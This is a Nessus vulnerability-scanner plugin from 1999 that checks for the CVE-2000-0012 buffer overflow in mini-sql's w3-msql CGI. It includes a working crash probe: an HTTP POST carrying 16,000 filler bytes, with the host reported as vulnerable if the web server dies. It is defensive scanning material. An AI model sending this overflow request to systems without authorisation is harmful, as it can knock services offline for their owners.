#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10296);
 script_bugtraq_id(898);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0012");
 
 name["english"] = "w3-msql overflow";
 name["francais"] = "Dépassement de buffer dans w3-msql";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The mini-sql program comes with the w3-msql CGI which is vulnerable 
to a buffer overflow.

An attacker may use it to gain a shell on this system.

Solution : contact the vendor of mini-sql (http://www.hugues.com.au)
           and ask for a patch. Meanwhile, remove w3-msql from
	   /cgi-bin
	   
Risk factor : High";


 desc["francais"] = "
Le programme mini-sql est installé avec le CGI 
w3-msql qui est vulnérable à un dépassement de buffer.

Un pirate peut utiliser ce problème pour obtenir
un shell sur ce système.

Solution : contactez le vendeur de mini-sql (http://hugues.com.au)
	   et demandez un patch. Pendant ce temps, retirez w3-msql
	   de /cgi-bin
	   
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Overflow in w3-msql";
 summary["francais"] = "Overflow dans w3-msql";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if (http_is_dead(port: port)) exit(0);

flag = 0;
cgi = "w3-msql/index.html";

foreach dir (cgi_dirs())
{
 if(is_cgi_installed_ka(port:port, item:string(dir, "/", cgi)))
 {
  flag = 1;
  directory = dir;
  break;
 }
}

if(!flag)exit(0);


s = "POST " + directory + "/w3-msql/index.html HTTP/1.0\r\n" +
     "Connection: Keep-Alive\r\n" +
     "User-Agent: Nessus\r\n" + 
     "Host: "+get_host_name()+"\r\n"+
     "Accept: image/gif, image/x-xbitmap, */*\r\n" +
     "Accept-Language: en\r\n" +
     "Content-type: multipart/form-data\r\n" + 
     "Content-length: 16000\r\n";
s2 = crap(16000);
s3 = s+s2;
s3 = string(s3);
s3 = s3 + string("\r\n\r\n");
soc = open_sock_tcp(port);
if(soc)
{
    send(socket:soc, data:s3);
    b = http_recv(socket:soc);
    close(soc); 
    if(!b)
    {
     if (http_is_dead(port: port))
       security_hole(port);
    }
}



